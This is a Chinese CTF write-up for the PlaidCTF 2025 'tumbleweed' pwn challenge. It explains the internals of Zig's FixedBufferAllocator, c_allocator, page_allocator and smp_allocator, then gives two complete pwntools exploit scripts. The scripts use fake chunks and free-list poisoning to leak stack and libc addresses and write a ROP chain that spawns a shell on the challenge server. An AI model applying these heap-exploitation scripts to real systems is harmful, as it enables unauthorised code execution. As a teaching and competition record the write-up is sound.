---
title: "TumbleweedInc"
description: "PlaidCTF2025"
date: "2025-04-10"
# weight: 1
# aliases: ["/first"]
categories: ["ctf"] # ctf, daily
series: ["pwn"] # pwn, stack, heap, shellcode, cpp, go, sandbox, qemu, kernel, windows, arm, aarch64, mips, ppc, realword, reverse, cve
highlights: "Zig language FixedBufferAllocator, c_allocator, smp_allocator, page_allocator, and corresponding memory management"
source: "PlaidCTF2025" # xxxctf2025, adword, buuctf, ...
difficulty: "easy" # high, medium, easy
tags: ["ctf", "pwn", "zig", "FixedBufferAllocator", "c_allocator", "smp_allocator", "page_allocator"]
attachmentURL: "attachment.zip"
draft: false
hidemeta: false
ShowCanonicalLink: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
cover:
    image: "images/cover.png" # image path/url
    # caption: "some text..." # display caption under cover
---

# 题目信息

```checksec
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x1000000)
Stripped:   No
Debuginfo:  Yes
```

不难但很有意义的一道题目，第一次见zig语言出的题目，并且借该题整理学习一下各种分配器的分配机制。

题目分别提供了四种分配器实例，可以对同一堆块交叉使用四种分配器的方法：

```zig
    heaps[0] = std.heap.c_allocator;
    heaps[1] = std.heap.page_allocator;
    heaps[2] = std.heap.smp_allocator;
    fba = std.heap.FixedBufferAllocator.init(&fba_buf);
    heaps[3] = fba.allocator();
```



# zig语言初探

参考：

* [Zig语言圣经](https://course.ziglang.cc/)
* https://github.com/ziglang/zig

## 简介

Zig 是一门面向低级系统编程的语言，可以直接与硬件交互、控制内存分配、以及提供高效的运行时性能，特别适用于操作系统、嵌入式系统、驱动程序等需要精细控制和高效执行的开发需求。它的设计目标是简化 C 语言的一些复杂性，同时提供比 C 更强的类型安全性和更好的工具链支持。

特点参考：[深入了解](http://ziglang.org/zh-CN/learn/overview/)

可以在线执行 zig 的平台：

* [zig-playground](https://playground.zigtools.org/)
* [zig-play](https://zig-play.dev/)
* [Riju](https://riju.codes/zig)



## 内存管理

参考：

* https://ziglang.org/zh-CN/learn/overview/
* https://course.ziglang.cc/advanced/memory_manage.html

为了实现“用 Zig 编写的库可以在任何地方使用”的目标，Zig的内存均通过程序员自己实现管理，包括分配、回收和错误处理。

zig 本身的标准库为我们提供了多种内存分配器：

1. [`GeneralPurposeAllocator`](https://ziglang.org/documentation/master/std/#std.heap.general_purpose_allocator.GeneralPurposeAllocator)
2. [`FixedBufferAllocator`](https://ziglang.org/documentation/master/std/#std.heap.FixedBufferAllocator)
3. [`ArenaAllocator`](https://ziglang.org/documentation/master/std/#std.heap.arena_allocator.ArenaAllocator)
4. [`HeapAllocator`](https://ziglang.org/documentation/master/std/#std.heap.HeapAllocator)
5. [`c_allocator`](https://ziglang.org/documentation/master/std/#std.heap.c_allocator)
6. [`page_allocator`](https://ziglang.org/documentation/master/std/#std.heap.page_allocator)
7. [`StackFallbackAllocator`](https://ziglang.org/documentation/master/std/#std.heap.StackFallbackAllocator)

除了这八种内存分配器外，还提供了内存池的功能 [`MemoryPool`](https://ziglang.org/documentation/master/std/#std.heap.memory_pool.MemoryPool)

> [!tips]
>
> 除了这些，还有一些很少用到的分配器：
>
> * `std.testing.FailingAllocator`
> * `std.testing.allocator`
> * `std.heap.LoggingAllocator`
> * `std.heap.LogToWriterAllocator`
> * `std.heap.SbrkAllocator`
> * `std.heap.ScopedLoggingAllocator`
>
> 另外，zig 的内存分配并不会自动进行 0 填充，并且 zig 并没有提供 `calloc` 这种函数，故我们需要手动实现初始化为 0 的操作。但 zig 提供了 [`std.mem.zeroes`](https://ziglang.org/documentation/master/std/#std.mem.zeroes) 函数，用于直接返回某种类型的 0 值。

下面仅详细介绍本题中用到的4种分配器。

### FixedBufferAllocator (FBA)

源码：[`lib/std/heap/FixedBufferAllocator.zig`](https://github.com/ziglang/zig/lib/std/heap/FixedBufferAllocator.zig)

[`std.heap.FixedBufferAllocator`](https://ziglang.org/documentation/master/std/#std.heap.FixedBufferAllocator)是一种**将内存分配到用户给定的缓冲区中且不进行任何堆分配**的分配器。当不需要使用堆时（例如编写内核时）这很有用。该分配器给定的缓冲区无法进行扩容，如果字节用尽，它会给出`OutOfMemory`错误。

```zig {hide=true}
const std = @import("std");
const expect = std.testing.expect;

test "fixed buffer allocator" {
    var buffer: [1000]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buffer);
    const allocator = fba.allocator();

    const memory = try allocator.alloc(u8, 100);
    defer allocator.free(memory);

    try expect(memory.len == 100);
    try expect(@TypeOf(memory) == []u8);
}
```

管理结构很简单：

```zig
end_index: usize, /// 标记已分配内存偏移
buffer: []u8,     /// u8数组
```

从内存看：

```bash
pwndbg> x /32gx 0x0000000001008448-0x80
0x10083c8 <tumbleweed.fba_buf>:	0x0000000000000000	0x0000000000000000
0x10083d8 <tumbleweed.fba_buf+16>:	0x0000000000000000	0x0000000000000000
0x10083e8 <tumbleweed.fba_buf+32>:	0x0000000000000000	0x0000000000000000
0x10083f8 <tumbleweed.fba_buf+48>:	0x0000000000000000	0x0000000000000000
0x1008408 <tumbleweed.fba_buf+64>:	0x0000000000000000	0x0000000000000000
0x1008418 <tumbleweed.fba_buf+80>:	0x0000000000000000	0x0000000000000000
0x1008428 <tumbleweed.fba_buf+96>:	0x0000000000000000	0x0000000000000000
0x1008438 <tumbleweed.fba_buf+112>:	0x0000000000000000	0x0000000000000000
0x1008448 <tumbleweed.fba>:	0x0000000000000000	0x00000000010083c8 # end_index; buffer.ptr
0x1008458 <tumbleweed.fba+16>:	0x0000000000000080 # buffer.len
```

该分配器按照类似栈的方式进行内存分配和释放。你可以分配新的内存块，但只能按照后进先出（LIFO）的顺序释放它们，即**只能对最后一个申请的堆块进行`free`及`resize`扩容操作**。

该分配器`alloc`、`free`、`resize/remap`、`reset`都**仅对`end_index`作加减，而不实际对`buffer`进行操作**，也不会清空缓冲区内容。以`resize`为例：

```zig
pub fn resize(
    ctx: *anyopaque,
    buf: []u8,
    alignment: mem.Alignment,
    new_size: usize,
    return_address: usize,
) bool {
    const self: *FixedBufferAllocator = @ptrCast(@alignCast(ctx));
    _ = alignment;
    _ = return_address;
    assert(@inComptime() or self.ownsSlice(buf));

    if (!self.isLastAllocation(buf)) { /// 如果不是最后一个堆块，则不会改变end_index，扩容返回false，缩小返回true
        if (new_size > buf.len) return false;
        return true;
    }

    if (new_size <= buf.len) { // 缩小最后一个堆块
        const sub = buf.len - new_size;
        self.end_index -= sub;
        return true;
    }

    const add = new_size - buf.len;
    if (add + self.end_index > self.buffer.len) return false;

    self.end_index += add;
    return true;
}
```



### c_allocator

源码：[lib/std/heap.zig](https://github.com/ziglang/zig/blob/master/lib/std/heap.zig)

调用C库的内存分配，是`malloc`函数的wrapper，在此基础上添加了对齐操作。

```zig {hide=true}
const std = @import("std");

pub fn main() !void {
    const c_allocator = std.heap.c_allocator;
    const num = try c_allocator.alloc(u8, 1);
    defer c_allocator.free(num);
}
```

> [!caution]
>
> Thin wrapper around regular malloc, overallocate to account for alignment padding and store the original malloc()'ed pointer before the aligned address.
>
> c_allocator和C语言的`malloc`并不完全相同，在分配的内存前会多一个原始分配的堆块指针和填充的`\x00`。
>
> 还有一个C语言的分配器是[`raw_c_allocator`](https://ziglang.org/documentation/master/std/#std.heap.raw_c_allocator)，直接使用 `malloc`分配内存，但当`alignment <= 0x10`时其实没有什么区别。

参考[源码](https://github.com/ziglang/zig/blob/2d33cc2e42d40ce0ee798d4d56c2d7da93ead44a/lib/std/heap.zig#L156)可知，`alloc`函数实际调用`alignedAlloc`：

1. 如果环境支持`posix_memalign`，则直接调用`posix_memalign`函数分配对齐的堆块；

2. 否则，实际申请的堆块大小为`len + alignment_bytes - 1 + @sizeOf(usize)`，并将堆块的原始指针存到原始堆块的头部，返回对齐后的内存地址：

   ```asciiflow
       unaligned_ptr --->+---------------+--------------+
                         | unaligned_ptr |              |
                         +---------------+              |
                         |          padding ...         |
         aligned_ptr --->+------------------------------+
                         |                              |
                         |                              |
                         |                              |
                         +------------------------------+
   ```

`free`实际调用`alignedFree`，如果环境支持`posix_memalign`，则直接调用`free`释放对齐的堆块，否则找到原始堆块的头部再调用`free`释放。

`resize/remap`实际调用`alignedAllocSize`，如果新申请的大小小于等于实际申请堆块的大小则扩展成功，则返回true，否则返回false。（**不允许扩展堆块大小**）



### page_allocator

源码：[lib/std/heap/PageAllocator.zig](https://github.com/ziglang/zig/blob/master/lib/std/heap/PageAllocator.zig)

每次执行分配时，它都会向操作系统申请整个内存页面。单个字节的分配可能会剩下数千的字节无法使用（现代操作系统页大小最小为 4K，但有些系统还支持 2M 和 1G 的页），由于涉及到系统调用，它的速度很慢，但好处是线程安全并且无锁。

```zig {hide=true}
const std = @import("std");

pub fn main() !void {
    const allocator = std.heap.page_allocator;
    const memory = try allocator.alloc(u8, 100);
    defer allocator.free(memory);
}
```

`alloc`调用`map`最终调用`mmap`实现分配，并在此基础上作了一些对齐操作。

`resize/remap`直接调用`realloc`重新分配。

`free`调用`munmap`释放内存。



### smp_allocator

源码：[lib/std/heap/SmpAllocator.zig](https://github.com/ziglang/zig/blob/master/lib/std/heap/SmpAllocator.zig)

`smp_allocator` 的设计目的是在多线程环境中提供高效且安全的堆内存分配。它的主要特点是通过为每个处理器核心（或线程）提供一个私有的分配区域，减少不同线程间的争用，从而提高性能。在分配内存时，多个线程或处理器核可以独立地操作各自的分配区域，减少了锁的使用和同步开销。

```zig {hide=true}
const std = @import("std");

pub fn main() !void {
  const allocator = std.heap.smp_allocator;
  const ptr = try allocator.alloc(u8, 100);
  allocator.free(ptr);
}
```

特点：

* 本地分配器（Per-Thread Allocation）：每个核心或线程维护一个本地堆区域。这样，线程对内存的分配和释放可以在其本地堆中进行，避免了与其他线程竞争对全局堆的访问。
* 全局回收机制：虽然每个线程有自己的本地堆分配区域，但是在某些情况下（例如线程退出或内存区域已满），这些本地堆区域的内存可能会被回收或归还给全局堆。这一机制确保了内存的高效使用。
* 锁与无锁机制：`smp_allocator` 会利用各种技术来减少锁的争用。例如，可以使用细粒度的锁或无锁的数据结构来管理多个线程的分配请求。
* 内存块的大小与对齐：为了提高内存访问效率和减少碎片化，`smp_allocator` 会根据具体的硬件架构以及内存对齐要求进行优化，确保内存块分配的对齐与访问是高效的。

#### 堆块组织

smp_allocator分配的堆块大小是固定的：

* 堆块最大为`64*1024bytes`（当前操作系统和硬件配置支持的最大页面大小可能不同，默认为`2MB`），对应最大索引`size_class_count = log2(0x10000) = 16`
* 堆块最小为`8bytes`，对应最小索引`min_class = log2(8) = 3`

```zig {hide=true}
const slab_len: usize = @max(std.heap.page_size_max, 64 * 1024);
/// Because of storing free list pointers, the minimum size class is 3.
const min_class = math.log2(@sizeOf(usize));
const size_class_count = math.log2(slab_len) - min_class;
```

#### 线程相关

每个smp_allocator实例维护一个线程本地变量`thread_index`和全局变量`global`：

```zig {hide=true}
cpu_count: u32,
threads: [max_thread_count]Thread,

var global: SmpAllocator = .{
    .threads = @splat(.{}),
    .cpu_count = 0,
};
threadlocal var thread_index: u32 = 0;

const max_thread_count = 128;
```

其中，`thread_index`标识当前线程序号，`alloc/free`操作前都会先尝试从全局变量`global.thread`中获取线程锁，如果失败则重新根据cpu数量分配一个`thread_index`：

```zig {hide=true}
    fn lock() *Thread {
        var index = thread_index;
        {
            const t = &global.threads[index];
            if (t.mutex.tryLock()) {
                @branchHint(.likely);
                return t;
            }
        }
        const cpu_count = getCpuCount();
        assert(cpu_count != 0);
        while (true) {
            index = (index + 1) % cpu_count;
            const t = &global.threads[index];
            if (t.mutex.tryLock()) {
                thread_index = index;
                return t;
            }
        }
    }
```

`global.thread`为`Thread`类型结构体数组（最大为128个线程）：

```zig {hide=true}
const Thread = struct {
    /// Avoid false sharing.
    _: void align(std.atomic.cache_line) = {},

    /// Protects the state in this struct (per-thread state).
    ///
    /// Threads lock this before accessing their own state in order
    /// to support freelist reclamation.
    mutex: std.Thread.Mutex = .{},

    /// For each size class, tracks the next address to be returned from
    /// `alloc` when the freelist is empty.
    next_addrs: [size_class_count]usize = @splat(0),
    /// For each size class, points to the freed pointer.
    frees: [size_class_count]usize = @splat(0),

    fn lock() *Thread {
        var index = thread_index;
        {
            const t = &global.threads[index];
            if (t.mutex.tryLock()) {
                @branchHint(.likely);
                return t;
            }
        }
        const cpu_count = getCpuCount();
        assert(cpu_count != 0);
        while (true) {
            index = (index + 1) % cpu_count;
            const t = &global.threads[index];
            if (t.mutex.tryLock()) {
                thread_index = index;
                return t;
            }
        }
    }

    fn unlock(t: *Thread) void {
        t.mutex.unlock();
    }
};
```

* `mutex`：线程锁
* `next_addrs`：能够分配的下一个空闲堆块地址数组，每个元素对应每种大小堆块**可新分配的地址**，当`frees`中没有对应大小的可用堆块时才从该数组分配；
* `frees`：回收堆块缓存数组，每个元素对应每种大小**释放后堆块的单链表**，链表指针为0时从`next_addrs`数组分配。

#### alloc

1. 由申请的堆块大小获得`class`，当`class >= size_class_count`时直接调用`PageAllocator.map(len, alignment);`分配；
2. 获取线程锁；
3. **尝试从`t.frees[class]`分配，成功则释放线程锁并返回`t.frees[class]`，维护`t.frees[class] = t.frees[class].*`；**
4. **尝试从`t.next_addrs[class]`分配，成功则释放线程锁并返回`t.next_addrs[class]`，维护`t.next_addrs[class] += slot_size`；**
5. 如果上述步骤均未分配成功，释放线程锁，重新获取`thread_index`，循环步骤2-5直到分配成功。

```zig {hide=true}
fn alloc(context: *anyopaque, len: usize, alignment: mem.Alignment, ra: usize) ?[*]u8 {
    _ = context;
    _ = ra;
    const class = sizeClassIndex(len, alignment);
    if (class >= size_class_count) {
        @branchHint(.unlikely);
        return PageAllocator.map(len, alignment);
    }

    const slot_size = slotSize(class);
    assert(slab_len % slot_size == 0);
    var search_count: u8 = 0;

    var t = Thread.lock();

    outer: while (true) {
        const top_free_ptr = t.frees[class];
        if (top_free_ptr != 0) {
            @branchHint(.likely);
            defer t.unlock();
            const node: *usize = @ptrFromInt(top_free_ptr);
            t.frees[class] = node.*;
            return @ptrFromInt(top_free_ptr);
        }

        const next_addr = t.next_addrs[class];
        if ((next_addr % slab_len) != 0) {
            @branchHint(.likely);
            defer t.unlock();
            t.next_addrs[class] = next_addr + slot_size;
            return @ptrFromInt(next_addr);
        }

        if (search_count >= max_alloc_search) {
            @branchHint(.likely);
            defer t.unlock();
            // slab alignment here ensures the % slab len earlier catches the end of slots.
            const slab = PageAllocator.map(slab_len, .fromByteUnits(slab_len)) orelse return null;
            t.next_addrs[class] = @intFromPtr(slab) + slot_size;
            return slab;
        }

        t.unlock();
        const cpu_count = getCpuCount();
        assert(cpu_count != 0);
        var index = thread_index;
        while (true) {
            index = (index + 1) % cpu_count;
            t = &global.threads[index];
            if (t.mutex.tryLock()) {
                thread_index = index;
                search_count += 1;
                continue :outer;
            }
        }
    }
}
```

#### free

1. 由申请的堆块大小获得`class`，当`class >= size_class_count`时直接调用`PageAllocator.unmap();`释放；
2. 获取线程锁；
3. **将释放后的堆块放入单链表`t.frees[class]`。**

```zig {hide=true}
fn free(context: *anyopaque, memory: []u8, alignment: mem.Alignment, ra: usize) void {
    _ = context;
    _ = ra;
    const class = sizeClassIndex(memory.len, alignment);
    if (class >= size_class_count) {
        @branchHint(.unlikely);
        return PageAllocator.unmap(@alignCast(memory));
    }

    const node: *usize = @alignCast(@ptrCast(memory.ptr));

    const t = Thread.lock();
    defer t.unlock();

    node.* = t.frees[class];
    t.frees[class] = @intFromPtr(node);
}
```

#### resize/remap

1. 由申请的堆块大小获得`class`，当`class >= size_class_count`时直接调用`realloc`重新分配堆块；
2. 当`class < size_class_count`时，如果`class`相同则返回`true`，否则返回`false`。（**不允许缩小或扩大堆块**）

> [!important]
>
> 个人认为`smp_allocator`比较关键的点就在于`frees`和`next_addrs`两个数组，利用空间很大，所以这里看的也比较详细。

---

> [!conclusion]
>
> * `FixedBufferAllocator`：
>   * 使用用户指定的内存缓冲区进行分配，`alloc/free/resize/reset`都仅移动`end_index`偏移值
>   * 按照类似栈的方式（LIFO）进行内存分配和释放，**只能对最后一个申请的堆块进行`free`及`resize`扩容操作，且扩容大小不能超过用户指定的内存缓冲区剩余大小**
> * `c_allocator`：
>   * `alloc`虽然使用C语言的`malloc`，但不完全相同，多了对齐操作。`raw_c_allocator`才使用纯C语言方式分配。当系统支持`posix_memalign`时直接调用`posix_memalign`函数分配对齐的堆块，否则在的分配内存前面（原始堆块头部）有自己的对齐管理结构。
>   * `free`实际调用`alignedFree`，如果环境支持`posix_memalign`，则直接调用`free`释放对齐的堆块，否则找到原始堆块的头部再调用`free`释放。
>   * `resize/remap`实际调用`alignedAllocSize`，如果新申请的大小小于等于实际申请堆块的大小则扩展成功，则返回true，否则返回false。（**不允许扩展堆块大小**）
> * `page_allocator`：
>   * `alloc`调用`map`最终调用`mmap`实现分配，并在此基础上作了一些对齐操作。
>   * `resize/remap`直接调用`realloc`重新分配。
>   * `free`调用`munmap`释放内存。
> * `smp_allocator`：
>   * 有线程锁
>   * 堆块大小固定（8~0x10000bytes）
>   * 当`class >= size_class_count(0x10000)`时，直接调用`PageAllocator.map/realloc/PageAllocator.unmap()`进行堆管理
>   * 当`class < size_class_count`时：
>     * `alloc`先从`frees`再从`next_addrs`进行分配
>     * `free`释放后堆块链入`frees`相应大小单链表
>     * `resize/remap`如果`class`相同则返回`true`，否则返回`false`。（**不允许缩小或扩大堆块**）

# Exp1 (use c_allocator)

我的非预期解，由于`fba_buf`正好在`fba`结构体上面，使用`FBA.alloc`利用bss段上的数据伪造overlap chunk如下：

```bash
pwndbg> x /32gx 0x10083C0
0x10083c0 <tumbleweed.tumbleweed_incubators+248>:	0x0000000000000000	0x0000000000000000
────────────────────────────────── fake chunk1
0x10083d0 <tumbleweed.fba_buf+8>:	0x0000000000000000	0x0000000000000021
0x10083e0 <tumbleweed.fba_buf+24>:	0x0000000000000000	0x0000000000000000
────────────────────────────────── fake chunk2
0x10083f0 <tumbleweed.fba_buf+40>:	0x0000000000000000	0x0000000000000081
0x1008400 <tumbleweed.fba_buf+56>:	0x0000000000000000	0x0000000000000000
0x1008410 <tumbleweed.fba_buf+72>:	0x0000000000000000	0x0000000000000000
0x1008420 <tumbleweed.fba_buf+88>:	0x0000000000000000	0x0000000000000000
0x1008430 <tumbleweed.fba_buf+104>:	0x0000000000000000	0x0000000000000000
0x1008440 <tumbleweed.fba_buf+120>:	0x0000000000000000	0x0000000000000000 # _               end_index
0x1008450 <tumbleweed.fba+8>:	        0x00000000010083c8	0x0000000000000080 # fba.buffer.ptr  fba.buffer.len
0x1008460 <os.argv>:	0x00007fffffffddf8	0x0000000000000001
──────────────────────────────────
0x1008470 <os.environ>:	0x00007fffffffde08	0x0000000000000032
```

通过将指针回退到`0x1008400`，`c_alloctor.free`释放fake chunk2链入tcache，`c_allocator.alloc`将fake chunk2申请回来，即可修改`fba`实现任意地址分配。

这里直接通过fake chunk2泄露`os.argv`栈指针，而后再`c_allocator.free/alloc`释放申请一次fake chunk2，将`fba.buffer.ptr`指向main返回地址，最后`fba.alloc`泄露libc基址，`fba.resize`再`fba.alloc`写ROP即可。

```python
from pwn import *

local = 0
pc = './tumbleweed'
aslr = True
context.log_level = "debug"
#context.terminal = ["deepin-terminal","-m","splitscreen","-e","bash","-c"]
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.os = "linux"

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(pc)

if local == 1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
else:
    remote_addr = ['tumbleweed.chal.pwni.ng', 1337]
    p = remote(remote_addr[0], remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    log.critical("{} -> {}".format(s, hex(addr)))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8, b'\x00'))
    else:
        return u64(rl().strip().ljust(8,b'\x00'))

class heap():
    c = 0
    page = 1
    smp = 2
    fixed = 3

def add(idx, size, heap_idx, content):
    ru("> ")
    sl("0")
    ru("Which incubator? ")
    sl(str(idx))
    ru("Size? ")
    sl(str(size))
    ru("> ")
    sl(str(heap_idx))
    ru("Label: ")
    sl(content)

def dele(idx, heap_idx):
    ru("> ")
    sl("1")
    ru("Which incubator? ")
    sl(str(idx))
    ru("> ")
    sl(str(heap_idx))

def show(idx):
    ru("> ")
    sl("2")
    ru("Which incubator? ")
    sl(str(idx))

def resize(idx, size, heap_idx):
    ru("> ")
    sl("3")
    ru("Which incubator? ")
    sl(str(idx))
    ru("size: ")
    sl(str(size))
    ru("> ")
    sl(str(heap_idx))

def bye():
    ru("> ")
    sl("4")

if __name__ == "__main__":
    fake1 = p64(0)
    fake1 += p64(0) + p64(0x21) + b"/bin/sh\x00".ljust(0x10, b"\x00")
    fake1 += p64(0) + p64(0x81)
    add(0, 0x40, heap.fixed, fake1)
    resize(0, 0x38, heap.fixed)

    add(1, 0x20, heap.fixed, b"\x11"*0x10)
    dele(1, heap.c)
    add(1, 0x70, heap.c, p64(0xdeadbeef))

    # leak stack
    show(1)
    rv(0x60)
    stack_addr = u64(rv(8))
    ret_addr = stack_addr-0x110
    lg("ret", ret_addr)

    fake2 = b"\x00"*0x48
    fake2 += p64(0) #off
    fake2 += p64(ret_addr-8) + p64(0x1000) # addr, size
    dele(1, heap.c)
    add(1, 0x70, heap.c, fake2)

    # leak libc
    add(2, 0x10, heap.fixed, b"a")
    show(2)
    rv(8)
    libc_base = u64(rv(8)) - 0x29d90
    
    system_addr = libc_base + 0x50d70
    binsh = 0x10083e0
    prdi_rbp = 0x1002e91
    rop = p64(prdi_rbp) + p64(binsh)*2
    rop += p64(system_addr)
    resize(2, 0x8, heap.fixed)
    add(3, 0x100, heap.fixed, rop)

    bye()
    p.interactive()
```



# Exp2 (use smp_allocator)

> babaisflag *—* 2024.04.07 05:17
>
> The idea for tumbleweed was for people to look at zig allocators to do fun shit across different allocators, so a bunch of unintended solutions is expected. Though, I forgot that resize of 0 is free, so that's definitely unintended lol.
>
> The intended is to use the fact that the fixed buffer allocator's resize doesn't actually resize the chunk (only sets the end_index of the backing buffer) to get overlapping chunks, and that smp allocator has a singly linked free list of power-of-2 chunk sizes, which gives you arbitrary write to clear out the burn_count. This gives you as much free as you need to do stack leaks, then libc leak, etc etc (since no PIE)

看discord得知，预期解是利用`smp_alloctor.frees`的单链表实现任意地址分配。

解题思路：

1. 使用`fba.alloc`分配chunk1和chunk2，`fba.resize(chunk2, 0)`，之后`smp_allocator.free`释放2个`fba.alloc`分配的堆块，再次`fba.alloc`可以uaf覆盖`smp_allocator.frees`单链指针，实现一次任意地址分配。
2. `smp_allocator.alloc`分配到`tumbleweed.fba`前，修改：
   * `fba.end_index = 0`
   * `fba.buffer.ptr = &heap.SmpAllocator.global.frees[8]`（这里指向0x100大小的单链表，还可以往后写更大的）
   * `fba.buffer.len = 0xa0000`（写个大一点的数就行，这里利用结尾的‘\n’刚好写成0xa0000）
3. 现在`fba.buffer`分配堆块写入就可以覆盖`heap.SmpAllocator.global.frees`链表指针了，之后就可以通过`fba.resize`和`smp_allocator.alloc`实现任意地址读写的原语，从而绕过了每种堆块只能释放2次的限制。

```bash
0x1008448 <tumbleweed.fba>:	0x0000000000000010	0x0000000001008590
0x1008458 <tumbleweed.fba+16>:	0x00000000000a0000
...
0x1008500 <heap.SmpAllocator.global>:	0x0000000000000000	0x0000000000000000
0x1008510 <heap.SmpAllocator.global+16>:	0x0000000000000000	0x0000000000000000
0x1008520 <heap.SmpAllocator.global+32>:	0x0000000000000000	0x0000000000000000
0x1008530 <heap.SmpAllocator.global+48>:	0x0000000000000000	0x0000000000000000
0x1008540 <heap.SmpAllocator.global+64>:	0x0000000000000000	0x0000000000000000
0x1008550 <heap.SmpAllocator.global+80>:	0x0000000000000000	0x0000000000000000
0x1008560 <heap.SmpAllocator.global+96>:	0x0000000000000000	0x0000000000000000
0x1008570 <heap.SmpAllocator.global+112>:	0x0000000000000000	0x0000000000000000 # <--- 0x10, 0x20
0x1008580 <heap.SmpAllocator.global+128>:	0x0000000000000000	0x0000000000000000 # <--- 0x40, 0x80
0x1008590 <heap.SmpAllocator.global+144>:	0x0000000000000000	0x0000000000000000 # <--- 0x100, 0x200
...
```

> [!caution]
>
> 这里由于每次申请必须输入内容，所以任意读可能会破坏目标地址内存，所以下面exp里实现的时候申请内存都在`addr-8`的位置

Exp：

```python
from pwn import *

local = 0
pc = './tumbleweed'
aslr = True
context.log_level = "debug"
#context.terminal = ["deepin-terminal","-m","splitscreen","-e","bash","-c"]
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.os = "linux"

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(pc)

if local == 1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
else:
    remote_addr = ['tumbleweed.chal.pwni.ng', 1337]
    p = remote(remote_addr[0], remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    log.critical("{} -> {}".format(s, hex(addr)))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8, b'\x00'))
    else:
        return u64(rl().strip().ljust(8,b'\x00'))

class heap():
    c = 0
    page = 1
    smp = 2
    fixed = 3

def add(idx, size, heap_idx, content):
    ru("> ")
    sl("0")
    ru("Which incubator? ")
    sl(str(idx))
    ru("Size? ")
    sl(str(size))
    ru("> ")
    sl(str(heap_idx))
    ru("Label: ")
    sl(content)

def dele(idx, heap_idx):
    ru("> ")
    sl("1")
    ru("Which incubator? ")
    sl(str(idx))
    ru("> ")
    sl(str(heap_idx))

def show(idx):
    ru("> ")
    sl("2")
    ru("Which incubator? ")
    sl(str(idx))

def resize(idx, size, heap_idx):
    ru("> ")
    sl("3")
    ru("Which incubator? ")
    sl(str(idx))
    ru("size: ")
    sl(str(size))
    ru("> ")
    sl(str(heap_idx))

def bye():
    ru("> ")
    sl("4")

if __name__ == "__main__":
    add(0, 0x40, heap.fixed, '\x00'*0x10)
    add(1, 0x40, heap.fixed, '\x11'*0x10)
    resize(1, 0, heap.fixed)
    dele(0, heap.smp)
    dele(1, heap.smp)

    add(2, 0x40, heap.fixed, p64(0x1008448))
    add(3, 0x40, heap.smp, '/bin/sh\x00')

    payload = p64(0) + p64(0x1008590) + b'\x00\x00' # fba.end_index  fba.bufffer.ptr  fba.buffer.len
    add(4, 0x40, heap.smp, payload)
    show(4)
    rv(0x18)
    ret_addr = u64(rv(8)) - 0x110
    lg("ret addr", ret_addr)

    add(5, 0x10, heap.fixed, p64(0xdeadbeef))
    def abread(addr):
        resize(5, 0, heap.fixed)
        add(5, 0x10, heap.fixed, p64(addr-8))
        add(6, 0x100, heap.smp, '')
        show(6)
    def abwrite(addr, content):
        resize(5, 0, heap.fixed)
        add(5, 0x10, heap.fixed, p64(addr))
        add(6, 0x100, heap.smp, content)

    abread(ret_addr)
    add(6, 0x100, heap.smp, '')
    show(6)
    rv(8)
    system_addr = u64(rv(8)) + 0x26fe0
    lg("system", system_addr)

    binsh = 0x1008408
    prdi_rbp = 0x1002e91
    rop = p64(prdi_rbp) + p64(binsh)*2
    rop += p64(system_addr)
    abwrite(ret_addr, rop)
    bye()

    p.interactive()
```

